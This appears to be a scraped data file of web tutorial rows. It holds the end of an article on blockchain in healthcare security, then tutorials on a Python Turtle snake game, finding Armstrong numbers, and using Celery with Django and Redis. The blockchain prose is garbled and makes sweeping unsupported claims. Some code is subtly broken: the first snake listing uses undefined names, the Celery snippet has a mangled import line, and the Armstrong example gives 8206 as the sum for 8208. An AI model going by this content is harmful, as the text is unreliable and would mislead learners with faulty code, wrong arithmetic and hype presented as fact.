sustainable, it is essential to establish solid policies that work within the framework you have chosen. Global policies are essential for maintaining throughout the entire world, as they aid to ensure conformity. Although the framework for compliance differs between companies but the objectives are similar. The objectives can be defined in order to implement greater security measures and ensure that employees are safe. This is crucial when policies constantly change, as well as the constantly changing nature of Blockchain implemented.', ""If there's a ledger backup on a specific system, it's then automatically checked in order to get the relevant data. This creates layer security that cannot be accessed. Therefore, it is essential not to grant access to this ledger to anyone outside of the network. This is essential to ensure the integrity of the Blockchain security, as any breach can cause unauthorized access to malicious parties. Even though the level of authorization for devices is great, maintaining a stable copy of the Blockchain is also essential. It's the most effective way to ensure your assets are protected and avoid getting into danger if there's a leak. While the majority of companies are focusing on enhancing compliance, a few have developed tools that provide more security."", 'The Blockchain is crucial in connecting all the parts distributed into one ecosystem. The system is also strong enough to handle the plethora of data. Information is consumed at a greater rate, and there is protection overall. The doctor has all the information he requires, no other than. Researchers can access anonymized patient and healthcare information. The pharmaceutical manufacturer is granted authorization and manufactures medications for various applications. This is an integrated system that is safe by using Blockchain.', ""Without Blockchain, every single element of the network could be vulnerable to attack. Each node represents an access point. It only requires one computer from the past or one network that isn't encrypted installed from end to end. Furthermore, there is more focus on the protection of nodes, which can eventually be achieved by using Blockchain."", ""There's a possibility that social engineering may be employed to obtain vital information, but it's very rare. Data could be leaking. With proper training and the right guidelines, this should not be a problem. Social engineering happens when there's massive confusion within the company about the security measures being implemented. Blockchain is a great technology to put into place, with every employee being given a brief introduction to the technology."", 'Blockchain technology can help reduce the risks associated with working in the healthcare sector. There are instances where the system of data or the network may fail within the organization, or the possibility of a DDoS attack may occur. If they are not targeted, the attack is likely to be costly in terms of resources as well as time-consuming to fix. Therefore, it is essential to have the proper tools in place to deal with any issue that might arise from attacks such as this.', ""Businesses can implement Blockchain-associated technologies in all industries for greater security. This is particularly crucial in situations where there are third-party suppliers that don't conform to the overall guidelines. It is equally important if there are partners already within the system or clients who do not follow the best practices for security management. Furthermore, they might create weaknesses in their security strategies which could permit hackers to exploit."", 'Hackers are able to launch a massive hive attack on the system and then take it down completely. This can be accomplished with a little savvy and lots of effort by the hacker. Blockchain is a great software to safeguard yourself fully. Healthcare professionals can be secure when they implement Blockchain for security platforms.', ""While minimizing risk is crucial, it's equally important to design security features that last more than just a few years. This is due to the fact that Blockchain is constantly evolving and creating new formats in the process. Healthcare companies need to keep up-to-date with evolving technology integrations and comprehend what technology is in its entirety. This is a way of improving security and staying just one step away from hackers. As Blockchain develops, so will the company itself. This will allow for more integration across the board and help the business remain secure even through the most complex technological advancements."", 'Digital can be a catalyst in this field because it provides the fundamental architecture to facilitate better integration. But businesses must be quick to recognize the issues that arise. They need to develop the best strategies to minimize risks across the board.', 'Wearables, for example, and connected health devices need access to the scale, infrastructure, and safety that Blockchain can offer. Blockchain technology will make it easier to connect technologies and build a robust ecosystem. For patients who rely on implanted technology, wearable technology, or connected accessories, Blockchain can be a more secure way to link the data.', 'As data flows through the system, it does this by connecting different routes in the system. The network itself is becoming more dynamic, resulting in several nodes becoming involved in the system. Blockchain could then become the main source of interconnectivity as well as security for moving objects. Everything from medicines to medical devices can be linked through the Blockchain ecosystem and utilized extensively across the entire ecosystem.', ""From a broader perspective, It is sensible to go with Blockchain. Blockchain technology makes it simpler for you to join the plethora of IoT and wearables parts within the network. With over 50 billion connected devices on the market by 2022, there's an increased need to get these connected via Blockchain. Every patient's information, including health, fitness, and vital metrics, can be shared at a lightning-fast speed. Blockchain enables streamlined data sharing and the retrieval of relevant information quicker than traditional databases."", 'Respect is an essential aspect when it comes to Blockchain and Healthcare. There are many participants in the Blockchain sector, and establishing agreements is becoming more complex with time. There are more regulations emerging from regulatory bodies regarding the integration of Blockchain as well as putting more focus on the privacy of patients.', 'Privacy is of paramount importance, particularly after the recent breaches of data and leaks occurred. As compliance becomes, more mainstream and more information is available on the most effective ways to safeguard private information. Blockchain stands out in all these areas and offers a better overall experience. In order to run a successful network that is able to cover all sectors within the healthcare sector, it is essential to manage a Blockchain network.', 'Compliance is a crucial aspect to be concerned about. It is a major area of concern, and Blockchain is becoming an innovator in this area. By introducing more effective measures of security and highlighting areas where improvement can be made, Blockchain is improving compliance on a global scale.', ""When businesses conduct an extensive risk analysis on the Blockchain area, there are gaps that need to be filled in immediately. This helps to stay in compliance in accordance with HIPAA as well as GDPR. As information is secured, the transmission of data can be protected. It's all about sharing important information and how effectively they're sharing it on the network."", ""In order for a Blockchain to be safe, there needs to be some form of security built into it. This includes requirements for compliance, which must be put outside of the technology that is used to create it. From authentication to using end-to-end encryption, various other end-point-related tools are available in conjunction with other tools. Although each HIPAA and GDPR regulate data management, it's crucial to be aware of the particulars that can affect your business in the Healthcare area."", ""PHI storage, specifically EHR platforms, is subject to compliance agencies' oversight. These platforms can be augmented by Blockchain and secured with rules that regulate actions. Furthermore, these scenarios could be more secure with a broad overview of the rules and regulations. As Blockchain is growing year after year, compliance authorities are expected to issue proper guidelines. The result will be a more secure market and provide greater security to everyone involved in the field."", 'The main challenge for Blockchain is in achieving an effective level of compliance. While it is simple to do on paper but when it comes to the practicality of Blockchain, it faces more serious issues than traditional systems for data. The urgency is with Blockchain, which has enabled greater integration across all. Because more hacks are occurring each day, companies are seeking to invest in more Blockchain integration. From a security perspective, Blockchain makes greater sense.', ""But, businesses must make sure they're in compliance when it comes to using Blockchain. Blockchain must be used alongside existing protocols and be more flexible in the healthcare sector. This will facilitate greater adoption across all sectors and make the whole process more regulated."", 'Healthcare organizations must be able to adhere to the security measures currently that are in place. Blockchain is the leader in technology who emerges as the top choice and security. It also includes additional assistance that third parties must provide. It also covers healthcare-related technology like AI as well as connected gadgets that must be secured using Blockchain.', ""Blockchain is a great way to provide the vast security infrastructure needed by companies to stay compliant throughout time. Since hackers constantly develop and develop, there's always the danger of using sophisticated AI to attack a massive and unprecedented scale. This is why healthcare companies are combining the latest AI and the power of Blockchain to enhance their security. They're no longer using technologies against one another on their own. They're doing it by having Blockchain integrated throughout the process."", ""The procedure of safeguarding the healthcare provider which is much simpler. The amount of work required to create the measures is massive. However, it is required in a more appropriate way in the present. According to research, 71% of legal executives don't believe their clients' infrastructure is secured enough. They require greater protection against hackers and malware that can attack every part of the network."", ""AI for cybersecurity can be made complete through the incorporation of Blockchain into the system. A study by Deloitte confirms that technology companies they studied didn't think their systems were strong enough to withstand attacks. Seventy-four percent of those who participated said they wanted to implement Blockchain to improve their security."", ""As technology evolves and systems evolve, it is essential to see clearly what the topic is. When the research department has access to data in a speedy manner and is able to develop the necessary tools to ensure that the system is properly integrated, on the other side, if the patient effectively receives top-quality healthcare, it's a win for Blockchain. Blockchain technology is able to improve all areas of the Healthcare sector, including privacy and regulation. It's designed to be scalable, and numerous businesses around the globe are achieving this. They're also developing solutions that other nations and businesses could model."", 'Blockchain is a thriving community that continues to innovate due to its increasing popularity in cryptocurrencies. This means that technological advancements will grow to higher levels. It also has potential in the field of AI and Machine Learning. When the developer community comes together and develops new technology, the results which emerge are more advanced. This means there are better returns for investing in Blockchain as early as possible. This is why healthcare providers should start their Blockchain initiatives as soon as their competitors and other companies within the field achieve their goals first. Healthcare must be transformed into a digital environment secure and safe.', ""Blockchain is among the most innovative technologies that have been introduced into the health sector. The main benefits of Blockchain surpass issues of integration and those that may arise due to developing talent and the specifics. Furthermore, Blockchain has advanced to the point where healthcare professionals are making use of the technology frequently. They're processing data at greater speed, and the data being transmitted is interoperable. In addition, technology has enabled greater access to security tools, which allows healthcare users to remain secure and safe in their transactions. Sharing data within the healthcare industry has never been easier.""]",[],[],[],[]
450,['Snake Game in Python using Turtle Module'],"[""The snake is an arcade maze game that was created in the company of Gremlin Industries and published by Sega in the month of October 1976. It is considered an excellent game and has been gaining popularity with the public for many generations. The Snake game can be controlled with the four direction buttons in relation to the direction it's heading into. The goal of playing the game is to score maximum points by grabbing food or fruits. The player is out of luck if the snake strikes the wall or itself.""]","['https://www.javatpoint.com/how-to-find-armstrong-numbers-between-two-given-integers', 'https://www.javatpoint.com/blockchain-in-healthcare-innovations-and-opportunities', 'https://www.javatpoint.com/how-to-find-armstrong-numbers-between-two-given-integers', 'https://www.javatpoint.com/blockchain-in-healthcare-innovations-and-opportunities', 'https://www.javatpoint.com/how-to-find-armstrong-numbers-between-two-given-integers']","['https://static.javatpoint.com/python/images/snake-game-in-python-using-turtle-module.png', 'https://static.javatpoint.com/python/images/snake-game-in-python-using-turtle-module2.png']",[],['Below is the Full Implementation of Code for Snake Game'],['Support'],[],"['Therefore, we will create a game that is based on Python with these modules.', 'The code below can work easily by using the Sublime Text application that is specifically designed to work with Python programs.', 'Here is the step-by-step method to make the Snake Game using the Turtle module:', 'Step 1. Adding modules to the program and then giving an initial value for each game.', 'Step 4: We will design the game in which the following things will be occurring:']","['Additionally, VSCode can be used to use this program. Install Python3 by utilizing extensions of VSCode. Then, save the Python3 program in the format of your_filename.py.', ""Step 2: We will create the display of this game, i.e., the screen of the game, where we'll create the snake's head and food items for the snake to eat during the game and display the score at the top in the game."", 'Step 3: We\'ll verify the key that controls the snake\'s movement. When we click on the terms commonly used in gaming, such as ""e"", ""s"", ""f"", and ""v"", we will be able to control the snake\'s movement around the screen.']",['For beginners in Python and those seeking to create something simpler in their field can test this program. The module called Turtle was specifically designed to be used for beginners to play with and submit a program of the project. This project is written using Python 3.0.'],"['import turtle as ttl', 'import time', 'import random as rdm', 'delay = 0.1', 'score = 0', 'high_score = 0', '# Here we will creating a window screen', 'w_n = ttl.Screen()', 'w_n.title(""Snake Game JavaTpoint"")', 'w_n.bgcolor(""black"")', ""# The width and height can be put as user's choice"", 'w_n.setup(width = 650, height = 650)', 'w_n.tracer(0)', '# Here, we will create the head of the snake', 'head1 = ttl.Turtle()', 'head1.shape(""circle"")', 'head1.color(""white"")', 'head1.penup()', 'head1.goto(0, 0)', 'head1.direction = ""Stop""', '# Here, we will create the food in the game', 'food1 = ttl.Turtle()', ""colors = rdm.choice(['pink', 'yellow', 'blue'])"", ""shapes = rdm.choice(['triangle', 'square', 'circle'])"", 'food1.speed(0)', 'food1.shape(shapes)', 'food1.color(colors)', 'food1.penup()', 'food1.goto(0, 100)', 'pen1 = ttl.Turtle()', 'pen1.speed(0)', 'pen1.shape(""square"")', 'pen1.color(""white"")', 'pen1.penup()', 'pen1.hideturtle()', 'pen1.goto(0, 250)', 'pen1.write(""Score: 0  High Score: 0"", align =""center"",', 'font = (""Consolas"", 22, ""bold""))', '# Here, we will assign the key directions', 'def group1():', 'if head1.direction != ""down"":', 'head1.direction = ""up""', 'def go_down():', 'if head1.direction != ""up"":', 'head1.direction = ""down""', 'def go_left():', 'if head1.direction != ""right"":', 'head1.direction = ""left""', 'def go_right():', 'if head1.direction != ""left"":', 'head1.direction = ""right""', 'def move1():', 'if head1.direction == ""up"":', 'y1 = head1.ycor()', 'head1.sety(y1 + 20)', 'if head1.direction == ""down"":', 'y1 = head1.ycor()', 'head1.sety(y1 - 20)', 'if head1.direction == ""left"":', 'x1 = head1.xcor()', 'head1.setx(x1 - 20)', 'if head1.direction == ""right"":', 'x1 = head1.xcor()', 'head1.setx(x1 + 20)', 'w_n.listen()', 'w_n.onkeypress(group1, ""e"")', 'w_n.onkeypress(go_down, ""v"")', 'w_n.onkeypress(go_left, ""s"")', 'w_n.onkeypress(go_right, ""f"")', '# Code for main gameplay', 'while True:', 'w_n.update()', 'if head1.xcor() > 295 or head1.xcor() < -295 or head1.ycor() > 290 or head1.ycor() < -295:', 'time.sleep(1)', 'head1.goto(0, 0)', 'head1.direction = ""Stop""', ""colors = rdm.choice(['pink', 'blue', 'yellow'])"", ""shapes = rdm.choice(['square', 'circle'])"", 'for segment1 in segments1:', 'segment1.goto(1050, 1050)', 'segments1.clear()', 'score = 0', 'delay = 0.1', 'pen1.clear()', 'pen1.write(""Score : {} High Score : {} "".format(', 'score, high_score), align = ""center"", font = (""Consoles"", 22, ""bold""))', 'if head1.distance(food1) < 20:', 'x = rdm.randint(-275, 275)', 'y = rdm.randint(-275, 275)', 'food1.goto(x, y)', '# Here, we are adding segment', 'new_segment1 = ttl.Turtle()', 'new_segment1.speed(0)', 'new_segment1.shape(""square"")', 'new_segment1.color(""orange"")  # tail colour', 'new_segment1.penup()', 'segments.append(new_segment1)', 'delay -= 0.001', 'score += 10', 'if score > high_score:', 'high_score = score', 'pen1.clear()', 'pen1.write(""Score: {} High Score: {} "".format(', 'score, high_score), align = ""center"", font = (""Consoles"", 22, ""bold""))', '# Checking for head collisions with body segments', 'for index in range(len(segments1)-1, 0, -1):', 'x = segments1[index-1].xcor()', 'y = segments1[index-1].ycor()', 'segments1[index].goto(x, y)', 'if len(segments1) > 0:', 'x1 = head1.xcor()', 'y1 = head1.ycor()', 'segments1[0].goto(x1, y1)', 'move()', 'for segment1 in segments1:', 'if segment1.distance(head1) < 20:', 'time.sleep(1)', 'head1.goto(0, 0)', 'head1.direction = ""stop""', ""colors = rdm.choice(['pink', 'blue', 'yellow'])"", ""shapes = rdm.choice(['square', 'triangle'])"", 'for segment1 in segments1:', 'segment1.goto(1050, 1050)', 'segment1.clear()', 'score = 0', 'delay = 0.1', 'pen1.clear()', 'pen1.write(""Score: {} High Score: {} "".format(', 'score, high_score), align = ""center"", font = (""Consoles"", 22, ""bold""))', 'time.sleep(delay)', 'w_n.mainloop()', 'import turtle as ttl', 'import time', 'import random as rdm', 'delay = 0.1', 'score = 0', 'high_score = 0', '# Here we will be creating a window screen', 'w_n = ttl.Screen()', 'w_n.title(""Snake Game JavaTpoint"")', 'w_n.bgcolor(""black"")', ""# The width and height can be put as user's choice"", 'w_n.setup(width = 650, height = 650)', 'w_n.tracer(0)', '# Here, we will create the head of the snake', 'head1 = ttl.Turtle()', 'head1.shape(""circle"")', 'head1.color(""white"")', 'head1.penup()', 'head1.goto(0, 0)', 'head1.direction = ""Stop""', '# Here, we will create the food in the game', 'food1 = ttl.Turtle()', ""colors = rdm.choice(['pink', 'yellow', 'blue'])"", ""shapes = rdm.choice(['triangle', 'square', 'circle'])"", 'food1.speed(0)', 'food1.shape(shapes)', 'food1.color(colors)', 'food1.penup()', 'food1.goto(0, 100)', 'pen1 = ttl.Turtle()', 'pen1.speed(0)', 'pen1.shape(""square"")', 'pen1.color(""white"")', 'pen1.penup()', 'pen1.hideturtle()', 'pen1.goto(0, 250)', 'pen1.write(""Score: 0, High Score: 0"", align = ""center"",', 'font = (""Consoles"", 22, ""bold""))', '# Here, we will assign the key directions', 'def group1():', 'if head1.direction != ""down"":', 'head1.direction = ""up""', 'def go_down():', 'if head1.direction != ""up"":', 'head1.direction = ""down""', 'def go_left():', 'if head1.direction != ""right"":', 'head1.direction = ""left""', 'def go_right():', 'if head1.direction != ""left"":', 'head1.direction = ""right""', 'def move():', 'if head1.direction == ""up"":', 'y1 = head1.ycor()', 'head1.sety(y1 + 20)', 'if head1.direction == ""down"":', 'y1 = head1.ycor()', 'head1.sety(y1 - 20)', 'if head1.direction == ""left"":', 'x1 = head1.xcor()', 'head1.setx(x1 - 20)', 'if head1.direction == ""right"":', 'x1 = head1.xcor()', 'head1.setx(x1 + 20)', 'w_n.listen()', 'w_n.onkeypress(group1, ""e"")', 'w_n.onkeypress(go_down, ""v"")', 'w_n.onkeypress(go_left, ""s"")', 'w_n.onkeypress(go_right, ""f"")', 'segments1 = []', '# Code for main gameplay', 'while True:', 'w_n.update()', 'if head1.xcor() > 290 or head1.xcor() < -290 or head1.ycor() > 290 or head1.ycor() < -290:', 'time.sleep(1)', 'head1.goto(0, 0)', 'head1.direction = ""Stop""', ""colors = rdm.choice(['pink', 'blue', 'yellow'])"", ""shapes = rdm.choice(['square', 'triangle'])"", 'for segment1 in segments1:', 'segment1.goto(1050, 1050)', 'segments1.clear()', 'score = 0', 'delay = 0.1', 'pen1.clear()', 'pen1.write(""Score: {} High Score: {} "".format(', 'score, high_score), align = ""center"", font = (""candara"", 24, ""bold""))', 'if head1.distance(food1) < 20:', 'x1 = rdm.randint(-275, 275)', 'y1 = rdm.randint(-275, 275)', 'food1.goto(x1, y1)', '# Here, we are adding segment', 'new_segment1 = ttl.Turtle()', 'new_segment1.speed(0)', 'new_segment1.shape(""square"")', 'new_segment1.color(""orange"")  # tail colour', 'new_segment1.penup()', 'segments1.append(new_segment1)', 'delay -= 0.001', 'score += 10', 'if score > high_score:', 'high_score = score', 'pen1.clear()', 'pen1.write(""Score : {} High Score : {} "".format(', 'score, high_score), align = ""center"", font = (""Consoles"", 22, ""bold""))', '# Checking for head collisions with body segments', 'for index in range(len(segments1)-1, 0, -1):', 'x1 = segments1[index - 1].xcor()', 'y1 = segments1[index - 1].ycor()', 'segments1[index].goto(x1, y1)', 'if len(segments1) > 0:', 'x1 = head1.xcor()', 'y1 = head1.ycor()', 'segments1[0].goto(x1, y1)', 'move()', 'for segment1 in segments1:', 'if segment1.distance(head1) < 20:', 'time.sleep(1)', 'head1.goto(0, 0)', 'head1.direction = ""stop""', ""colors = rdm.choice(['pink', 'blue', 'yellow'])"", ""shapes = rdm.choice(['square', 'triangle'])"", 'for segment1 in segments1:', 'segment1.goto(1050, 1050)', 'segment1.clear()', 'score = 0', 'delay = 0.1', 'pen1.clear()', 'pen1.write(""Score: {} High Score: {} "".format(', 'score, high_score), align = ""center"", font = (""Consoles"", 22, ""bold""))', 'time.sleep(delay)', 'w_n.mainloop()']",[],[],"[""|||Turtle: This is an installed Python library that allows users to draw patterns and images by providing the user with a virtual canvas.|||Time: It is used in order to calculate the number of seconds since the date of the event.|||Random: This is a function utilized to create random numbers in Python through the use of the random module.||||||The snake's body will expand body after eating the fruits.|||Colouring the snake's tail.|||When the fruit has been eaten, The score will then be recorded.|||Examining the snake's head for collides with body or side of the screen.|||The game will automatically restart immediately following the collision.|||A new design and shape of this fruit are revealed each time the window is opened.|||Scores will then be reset to zero, and the highest score will be kept until the window has not shut.|||""]"
451,['How to Find Armstrong Numbers between two given Integers'],"[""An integer is referred to as the Armstrong numbers of the order n. When it's each digit is separated, cubed, and added together then it will result in a sum that is the same as the number, (i.e., pqrs... = pn + qn + rn + sn +...).""]","['https://www.javatpoint.com/celery-tutorial-using-python', 'https://www.javatpoint.com/snake-game-in-python-using-turtle-module', 'https://www.javatpoint.com/celery-tutorial-using-python', 'https://www.javatpoint.com/snake-game-in-python-using-turtle-module', 'https://www.javatpoint.com/celery-tutorial-using-python']",[],[],['Conclusion'],[],[],"['If there is an Armstrong number with three digits, the total of cubes in each number is equal to the number in itself.', 'In this tutorial, we will learn how we can find Armstrong numbers between two given integers by using Python language.', 'For example:', 'In this tutorial, we have discussed how to print Armstrong numbers between two given integers using Python programming.']",[],"['The method we use below is easy. We look through all numbers within the range. For each number, we first determine the number of digits within it. Make the total number of decimal digits of the current number be the number ""n"". Then we calculate the sum of the"" n-th"" power of each digit. If the sum is greater than ""K"", then we record the result.']","['371 = 3 * 3 * 3 + 7 * 7 * 7 + 1 * 1 * 1', '= 27 + 343 + 1', '= 371', 'Therefore, 371 is an Armstrong number.', 'Input: Two Integer Numbers: 1000 10000', 'Output: Armstrong Numbers Between Two Given Integers: 1634 8208 9474', 'Explanation: For the Output numbers: 1000 and 10000 are given two integers. (interval)', '1634 = 1 * 1 * 1 * 1 + 6 * 6 * 6 * 6 + 3 * 3 * 3 * 3 + 4 * 4 * 4 *4', '= 1 + 1296 + 81 + 256', '= 1634', '8208 = 8 * 8 * 8 * 8 + 2 * 2 * 2 * 2 + 0 * 0 * 0 * 0 + 8 * 8 * 8 * 8', '= 4096 + 16 + 0 + 4096', '= 8206', '9474 = 9 * 9 * 9 * 9 + 4 * 4 * 4 *4 + 7 * 7 * 7 * 7 + 4 * 4 * 4 *4', '= 6561 + 256 + 2401 + 256', '= 9474', '# First we will import required module:', 'import math', 'lower1 = int(input(""Please enter the lower range of the integer: ""))', 'upper1 = int(input(""Please enter the upper range of the integer: ""))', 'print(""The Armstrong Numbers Between Two Given Integers:"")', 'for num_1 in range(lower1, upper1 + 1):', '# Now, we will set the order of number', 'order1 = len(str(num_1))', '# here, we are initializing sum', 'sum = 0', 'temp1 = num_1', 'while temp1 > 0:', 'digit1 = temp1 % 10', 'sum += digit1 ** order1', 'temp1 //= 10', 'if num_1 == sum:', 'print(num_1)']","['Please enter the lower range of the integer:  1000', 'Please enter the upper range of the integer:  10000', 'The Armstrong Numbers Between Two Given Integers:', '1634', '8208', '9474']",[],[]
452,['Celery Tutorial Using Python: Must Learn Technology for Python Developer'],"['In this tutorial, we will discuss the most popular, must learn and technology for Python developers. Everybody in the Python developer association has learned about the Celery or may be implemented at least once.']","['https://www.javatpoint.com/rsme-root-mean-square-error-in-python', 'https://www.javatpoint.com/how-to-find-armstrong-numbers-between-two-given-integers', 'https://www.javatpoint.com/https://docs.celeryproject.org/en/stable/getting-started/introduction.html#installation', 'https://www.javatpoint.com/https://www.javatpoint.com/djano-tutorial', 'https://www.javatpoint.com/https://github.com/tporadowski/redis/releases', 'https://www.javatpoint.com/https://github.com/tporadowski/redis/releases/download/v5.0.14/Redis-x64-5.0.14.msi', 'https://www.javatpoint.com/rsme-root-mean-square-error-in-python', 'https://www.javatpoint.com/how-to-find-armstrong-numbers-between-two-given-integers', 'https://www.javatpoint.com/rsme-root-mean-square-error-in-python']","['https://static.javatpoint.com/python/images/celery-tutorial-using-python.png', 'https://static.javatpoint.com/python/images/celery-tutorial-using-python2.png', 'https://static.javatpoint.com/python/images/celery-tutorial-using-python3.png']",[],"['What is Celery?', 'Why is it useful?', 'How Does Celery Works?', 'Features of Celery', 'Getting Started with Celery', 'Conclusion']","['Create a Django Project', 'pip install django', 'Installation', 'Celery Configuration', 'Choosing a Broker', 'Create celery.py file', 'Create a Celery Task', 'Running Celery Locally']","['Note - Celery and Redis can be installed using the single command which is given below.', 'Note - To see the celery result, install the following third-party app and register in the settings.py file.']","['So here the question arises, how can we provide a fast user experience while our complicated task is still loading?', 'Here is the asynchronous programming comes into play. Celery is used for the parallel execution of the task.', 'In this tutorial, we will discuss the following concepts of Celery.', 'Celery combines various web frameworks, including Flask, Pylons, web2py, Tryton, and Tornado.', ""Celery's workers can then update the UI via callbacks, process files, send emails, make changes in database and many more."", ""The main advantage of Celery is that our application can continue to respond to client requests. So the end-users don't have to wait unnecessarily."", ""Let's understand the working scenario of Celery."", ""In this tutorial, we will implement the Celery with Django, where we will create a simple task queue. Let's start by following the below steps."", 'Once the virtual environment is created, we will activate using the below command.', 'Install the Django using the below command.', 'After the installation of Django, create a project. We are creating project named learn_celery using below command.', 'We can install Celery using the below command.', 'After the celery installation, we will configure the Celery in the Django project.', ""Open project's settings.py file and add the below configuration. We are using redis as a message broker."", 'In this tutorial, we will use the Redis Message Broker.', 'Redis Installation in Windows', 'Redis dependency is also required to run the celery program. We can install redis dependency using the below command.', 'Once the installation is completed, fire up the server using the below command.', 'We can test whether Redis is working properly by typing the following command in the terminal.', 'If it replies with the PONG, it is working fine.', 'Now open the celery.py file in the Django project and add the below code.', 'The celery tasks can be created in the tasks.py in the Django app/project. We create an app in working directory using the below command.', 'Now create a view in the view.py file.', 'Now we will map this view to URL in the urls.py file.', 'CeleryApp/urls.py', 'Now open new terminal and navigate to project directory, activate the virtual env. To start the celery worker run the following command.', 'As we can see that our Celery has started and ready to perform the background jobs. The Redis message broker is running on 6379 port by default.']","['In the era of the fast internet, users want to load the page instantaneously and get the result in seconds. The small tasks can be executed within a second or microseconds, but the heavy task may take many seconds or even a minute.', ""Celery provides the facility to run the program/jobs in the background when the CPU is sitting ideal. Before diving deeper in this topic, let's understand the core concept of Celery and why we use it."", 'Suppose we need to access API every minute (hour), or we want to send multiple emails at the end of the day. Celery can schedule that type of periodic task easily.', ""Let's take another scenario: a user sends a request, and the page is taking too long to load. Meanwhile, Celery decreases page load time by running part of the functionality as postponed tasks on the same server or sometime different server."", 'Celery interacts via messages; normally broker works as a mediate between clients and workers. The inward working of the Celery affirms as Producer and Consumer pattern. Celery has the three chief elements at the high level.', ""Producers - Producers are 'web nodes' that manages the web requests. When the application is processing, tasks are assigned to the Celery means forced into the task queue."", ""Consumer - Consumers are the 'worker nodes' that monitors the queue head, the workers take the tasks and perform it. Workers can perform various tasks as well; hence they can also behave as producers."", 'Celery is a handy structure that decreases production load through delayed tasks, as it prepares asynchronous and planned jobs. Following are some important features of the Celery.', 'First, we will create a Django project named learn_celery in the celery_django folder. But first we will create the virtual environment. All dependencies will be stored in the virtual env.', 'If you are not familiar how to create project or app in Django, you can visit our Django tutorial. Now, we are ready to install Celery in our virtual environment.', 'Installation of Redis in Mac/Ubuntu is pretty straightforward but slightly tricky for Window. So here we are describing how you can install redis in Windows.', 'Once an application is created, create a task.py file and create a task. The tasks are the regular Python functions that are called with the Celery. For example - We create a function that will print the 1 to 10 integer number.', 'Now we are ready to execute our first asynchronous task. Now run the python manage.py runserver and click on the local host link http://127.0.0.1:8000/.']","[""Celery is an open-source Python library which is used to run the tasks asynchronously. It is a task queue that holds the tasks and distributes them to the workers in a proper manner. It is primarily focused on real-time operation but also supports scheduling (run regular interval tasks). It enhances the end's user activity amazingly. Celery introduces the various message brokers such as RabbitMQ and Redis."", 'In the traditional HTTP request-response cycle, when we send the request to the server through the client, the server sends the response to the client. It works appropriately for small tasks, but it may become slow when we try to load the large tasks. Hence, we need to implement a functionality that can decrease the load time.', 'Queue - It is basically a message broker which acts as a bridge between producer and consumer. It essentially passes messages between web application and the Celery workers. Celery has wide support for RabbitMQ and Redis, also helps Zookeeper, Amazon SQS but with confined abilities.', ""Brokers are separate services that enable applications, systems, and services to communicate and share information. Let's simplify this term we assign tasks to workers via a message queue. A message queue is a first-in, first-out data structure which means the message is stored at first place will be executed first. All tasks will perform in the order that we add them."", 'Every time when we visit http://127.0.0.1:8000/ to make request to Django server, we should see the response and Celery performed the task in the background asynchronously that we have defined in the task.py file. That can be monitored in the Celery terminal.', 'Celery is a powerful job queue to run the tasks in the background. It is most commonly used to send frequent emails. However, it can be used in multiple ways. We can set up a queue; work with data chunks on the long-running tasks at hand, and define times to execute our tasks.', 'In this tutorial, we have taken the simple example of Celery using Django. We have defined the basic concept of Celery and how it works. We have also specified how we can implement Celery along with Django. You can take the reference of this tutorial and use Celery to run your asynchronous task.']","['import os', 'from celery import Celery', 'from celery.schedules import crontab', ""# Set the default Django settings module for the 'celery' program."", ""os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'learn_django.settings')"", '#pass the project name in Celery(project_name)', ""app = Celery('learn_django')"", ""# Using a string here means the worker doesn't have to serialize"", '# the configuration object to child processes.', ""# - namespace='CELERY' means all celery-related configuration keys"", '#   should have a `CELERY_` prefix.', ""app.config_from_object('django.conf:settings', namespace='CELERY')"", '#Celery Beat Settings', 'app.conf.beat_schedule = {', ""'send-mail-every-day-at-8' :  {"", ""'task': 'emailExample.tasks.send_mail_func',"", ""'schedule': crontab(hour = 15, minute = 42),"", '# Load task modules from all registered Django apps.', 'app.autodiscover_tasks()', '@app.task(bind=True)', 'def debug_task(self):', ""print(f'Request: {self.request!r}')"", 'C:\\Users\\User\\Desktop\\celery_django>python manage.py startapp celeryApp .', 'rom celery import shared_task', '@shared_task(bind=True)', 'def test_func(self):', 'for i in range(10):', 'print(i)', 'return ""Completed""', 'from django.http import HttpResponse', '# importing task from tasks.py file', 'from .tasks import test_func', '# Create your views here.', 'def test(request):', '# call the test_function using delay, calling task', 'test_func.delay()', 'return HttpResponse(""Done"")', 'from django.urls import path', 'urlpatterns = [', ""path('', test, name='test'),"", 'pip install django-celery-result', 'PS D:\\celeryPython> celery -A CeleryDjango.celery worker --pool=solo -l info', '[2022-01-07 23:10:27,920: INFO/MainProcess] Connected to redis://127.0.0.1:6379//', '[2022-01-07 23:10:27,936: INFO/MainProcess] mingle: searching for neighbors', '[2022-01-07 23:10:29,007: INFO/MainProcess] mingle: all alone', '[2022-01-07 23:10:29,029: WARNING/MainProcess] C:\\Users\\DEVANSH SHARMA\\.virtualenvs\\celeryPython-O5XHNBO2\\lib\\site-packages\\celery\\fixups\\django.py:203: UserWarning: Using settings.DEBUG leads to a memory', 'leak, never use this setting in production environments!', ""warnings.warn('''Using settings.DEBUG leads to a memory""]",[],[],"['|||What is Celery?|||How does it work?|||What are Tasks Queues?|||What are Message Brokers?|||Why is this Useful?|||How does it work?|||Features of Celery|||Getting Started with Celery||||||Open-source Library - Python Celery is open-source and free software. This feature attracts the organizations or developers to use celery and solve their tasks without paying any penny.|||Straight Forward Installation - It is a lightweight and simple library and it can be installed easily. We can install it from the terminal using the command ""pip install -U Celery"".|||Scheduling - We can specify the particular time to run a task using the datetime module along with celery beat. The celery beat can trigger the tasks in regular intervals. We can use the periodic task for the repeated events based on the simple interval.|||Broker Support - Celery supports the multiple message brokers, popularly RabbitMQ and It also supports the Amazon SQS but lacks in some features (monitoring and remote control).|||Integration with Web Frameworks - Celery also incorporates with the various Python web frameworks such as Pyramid, Pylons, Django, Tornado, Trylons, and Flask.|||Fast - Celery can process millions of tasks within a minute.|||Works-flow - It can compose the simple and complex works flows using the set of advance primitives which known as ""canvas"".||||||Visit the Github link https://github.com/tporadowski/redis/releases, and click on Redis-x64-5.0.14.msi. It will download the .msi file.||||||Click on the downloaded setup. It will automatically install redis in your system in C: drive. Once it has installed, open the redis-cli and type the PING.||||||']"
